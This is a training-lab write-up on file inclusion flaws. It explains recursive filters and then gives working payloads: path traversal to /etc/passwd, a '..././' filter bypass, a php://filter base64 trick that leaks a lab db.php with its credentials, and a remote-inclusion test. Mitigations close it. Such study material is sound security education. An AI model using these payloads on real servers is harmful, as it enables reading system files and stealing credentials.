
# 📁 File Inclusion 0x02 - Remote File Inclusion Attacks

---

## 🔄 Recursive Filters Explained

### What Makes a Filter Recursive? 🤔
A recursive filter repeatedly applies its rules to an input until no more undesirable elements are found.  
It is like cleaning a stain: you keep wiping until nothing is left, no matter how many times it takes.  
In programming, this "wiping" is the function calling itself with updated parameters each time, ensuring a thorough cleanup.

---

### How Recursive Filters Work ⚙️
Recursive filters are essential in security contexts where input must be sanitized thoroughly.  
They remove or neutralize harmful sequences (like `../` in paths) by reprocessing the input multiple times, ensuring manipulations like path traversals are caught and cleaned effectively.

---

### Why `./` Is Used and Its Effects 📂
Adding `./` (which means "current directory") in paths, especially mixed with `../` (up one directory), is a technique used to hide malicious intent.  
It complicates the path, potentially confusing simple filters and allowing deeper directory traversal than permitted, unless a recursive filter is in place to catch and resolve these manipulations repeatedly.

---

## 🌐 Lab Answer

### Initial Request
```
GET /labs/fi0x02.php?filename=files%2Fchocolate_cake.txt HTTP/1.1
```

### Exploiting LFI
1. Change the request to:
   ```
   GET /labs/fi0x02.php?filename=../../../../../etc/passwd HTTP/1.1
   ```
2. URL-encode the path using Burp Suite:
   - Highlight the path, right-click, and select "Convert Selection > URL-encode key characters".
3. Test payloads to bypass recursive filters:
   - Add `../` recursively:
     ```
     ..././..././..././..././etc/passwd
     ```
4. Use **PayloadsAllTheThings** for advanced testing:  
   [PayloadsAllTheThings - File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

---

## 🌍 Testing for Remote File Inclusion

### Test Payload
```
GET /labs/fi0x02.php?filename=https://google.com HTTP/1.1
```
- **Outcome:**  
  A successful response confirms a Remote File Inclusion (RFI) vulnerability.

---

## 📊 Examples of File Inclusion Vulnerabilities

### Base64 Encoding to Mask File Paths 🔒
**Example URL:**
```
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
```
- Encodes output of files in Base64 to bypass filters and view server-side files.

---

### Extracting Database Credentials 🗝️
**Request:**
```
GET /labs/fi0x02.php?filename=php://filter/convert.base64-encode/resource=..././db.php HTTP/1.1
```
**Decoded Response:**
```php
<?php

$servername = "bb-db";
$username = "bb-labs-user";
$password = "bb-labs-password";
$dbname = "bb-labs";

$conn = new mysqli($servername, $username, $password, $dbname);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

```

---

### Remote URL File Inclusion 🌍
**Request:**
```
GET /labs/fi0x02.php?filename=https://google.com HTTP/1.1
```
**Response:**
- Includes the actual content from Google's website, demonstrating the risks of allowing external URL inclusions.

---

## 🛠️ Mitigation
1. **Sanitize Inputs:** Strictly validate and sanitize user inputs to prevent LFI/RFI attacks.  
2. **Disable Remote Inclusion:** Configure server settings to block external file inclusions.  
3. **Monitor Logs:** Regularly review server logs to detect unauthorized access attempts.

---
